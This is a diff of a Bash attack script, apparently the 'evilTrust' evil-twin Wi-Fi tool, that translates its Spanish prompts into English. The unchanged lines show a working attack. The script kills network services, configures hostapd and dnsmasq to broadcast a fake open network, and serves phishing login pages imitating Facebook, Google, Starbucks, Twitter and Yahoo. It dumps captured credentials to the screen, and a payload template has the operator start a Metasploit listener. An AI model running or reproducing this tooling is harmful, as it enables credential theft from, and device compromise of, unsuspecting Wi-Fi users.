@@ -367,9 +367,9 @@ eviltrust() {
 		activeHosts=0
 		tput civis
 		while true; do
-			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctrl + C para salir${endColour}${grayColour})...${endColour}\n${endColour}"
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Waiting for credentials (${endColour}${redColour}Ctrl + C for exit${endColour}${grayColour})...${endColour}\n${endColour}"
 			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
-			echo -e "${redColour}[*]$grayColour Dispositivos conectados: ${endColour}${blueColour}$activeHosts${endColour}\n"
+			echo -e "${redColour}[*]$grayColour Connected devices: ${endColour}${blueColour}$activeHosts${endColour}\n"
 			find \-name datos-privados.txt | xargs cat 2>/dev/null
 			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 			activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
@@ -383,9 +383,9 @@ eviltrust() {
 		fi
 
 		rm iface 2>/dev/null
-		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre de la red a utilizar (Ej: wifiGratis):${endColour} " && read -r use_ssid
-		echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
-		echo -e "\n${redColour}[!]$grayColour Cerrando todas las conexiones...${endColour}\n"
+		echo -ne "\n${yellowColour}[*]${endColour}${grayColour}Name of the network to be used (Ej: WifiFree):${endColour} " && read -r use_ssid
+		echo -ne "${yellowColour}[*]${endColour}${grayColour} Channel to use (1-12):${endColour} " && read use_channel; tput civis
+		echo -e "\n${redColour}[!]$grayColour Closing all connections...${endColour}\n"
 		sleep 2
 		killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
 		sleep 5
@@ -399,13 +399,13 @@ eviltrust() {
 		echo -e "auth_algs=1\n" >> hostapd.conf
 		echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
 
-		echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz ${tar}${endColour}\n"
+		echo -e "${yellowColour}[*]${endColour}${grayColour} Configuring interface ${tar}${endColour}\n"
 		sleep 2
-		echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
+		echo -e "${yellowColour}[*]${endColour}${grayColour} Starting hostapd...${endColour}"
 		hostapd hostapd.conf > /dev/null 2>&1 &
 		sleep 6
 
-		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
+		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configuring dnsmasq...${endColour}"
 		echo -e "interface=${tar}\n" > dnsmasq.conf
 		echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
 		echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
@@ -426,8 +426,8 @@ eviltrust() {
 		cd src/
 		plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
 
-		tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
-		echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template
+		tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} If you want to use your own template, create another directory in the project and specify its name :)${endColour}\n\n"
+		echo -ne "${yellowColour}[*]${endColour}${grayColour} Template to be used (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template
 
 		check_plantillas=0; for plantilla in "${plantillas[@]}"; do
 			if [ "$plantilla" == "$template" ]; then
@@ -450,14 +450,14 @@ eviltrust() {
 			echo -e "\n${yellowColour}[*]${endColour}${grayColour}Starting server PHP...${endColour}"
 			php -S 192.168.1.1:80 > /dev/null 2>&1 &
 			sleep 2
-			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configura desde otra consola un Listener en Metasploit de la siguiente forma:${endColour}"
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configure from another console a Listener in Metasploit as follows:${endColour}"
 			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 			cat msfconsole.rc
 			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
-			echo -e "\n${redColour}[!]${grayColour} Enter para continuar${endColour}" && read
+			echo -e "\n${redColour}[!]${grayColour} Enter to continue${endColour}" && read
 			popd > /dev/null 2>&1; getCredentials
 		else
-			tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
+			tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} 	Using custom template...${endColour}"; sleep 1
 			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting server web in${endColour}${blueColour} $template${endColour}\n"; sleep 1
 			pushd $template > /dev/null 2>&1
 			php -S 192.168.1.1:80 > /dev/null 2>&1 &
